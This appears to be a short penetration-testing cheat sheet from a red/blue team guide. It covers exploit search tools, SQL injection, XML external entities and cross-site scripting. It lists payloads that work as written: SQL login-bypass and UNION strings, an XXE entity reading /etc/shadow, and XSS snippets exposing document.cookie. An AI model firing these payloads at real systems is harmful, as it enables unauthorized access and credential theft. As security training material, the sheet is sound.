# TABLE OF CONTENTS
1. [GENERAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation_General.md#general)
2. [SQL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation_General.md#sql)
3. [XML](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation_General.md#xml)
4. [XSS]

# GENERAL
## Search Exploits
- google --> <service_name> [version] exploit
- shodan --> https://exploits.shodan.io/
- searchsploit (= ExploitDB lookup) --> CLI Example: `searchsploit apache mod_ssl`
- msf: `search platform:windows port:135 target:XP type:exploit`

# SQL
**>> Full Cheat Sheet: [www.netsparker.com/blog](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)**

## SQL Types
1. MySQL
2. SQL Server
3. PostgreSQL
4. Oracle
5. Others

## SQL Injection: Quick and Dirty
```
admin' --
admin' #
admin'/*
' or 1='1
' or 1=1--
' or 1=1#
' or 1=1/*
') or ‘1’ =’1--
') or (‘1’=’1--
' || 1=’1
```

## SQL Attack Patterns
#### Comment
```
1) --
2) /*  */
3) #
```

#### Combine Queries 
- `SELECT * FROM xyz ; SELECT * FROM abc`

#### UNION injections
- You can poison query to return records from different tables
- `SELECT username, admin FROM members UNION SELECT password, admin FROM members`


## Tools
#### mssqlclient.py
- `python3 mssqlclient.py USER@10.10.10.27 -windows-auth`
- `SELECT IS_SRVROLEMEMBER('sysadmin')`
   - Output "1" = yes

#### sqlmap
- Check out: [3_Exploitation/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/3_Exploitation/Web%20Application.md)

<br />

# XML
## Missing Encryption/Input Validation
- XML data vulnerable to spoofing /request forgery / code injection

## XML Bomb
- Entities that expand to exponential size, consuming memory (DoS!)

## XML External Entity (XXE)
- Embeds a request for a local resource
- File Inclusion within XML
  - `<!ENTITY runcode SYSTEM "/etc/shadow">`

<br />

# XSS
## XSS Types

*Attacker embeds malicious scripting commands on a trusted website*

1. **Reflected XSS**
- non-persistent effect activated by a victim clicking a link
- Example: `https://example.com/search?q=<script%20type='application/js'>alert('xss')</script>`
2. **Stored/Persistent XSS**
- Attempts to store data persistently on the web server
3. **DOM-based XSS**
- Attempt to exploit the victim's web browser
- Example: `https://example.com/index.html#default=<script>alert(document.cookie)</script>`

## Attack Patterns
```
<script>alert("XSS LEAK")</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(2)>
```
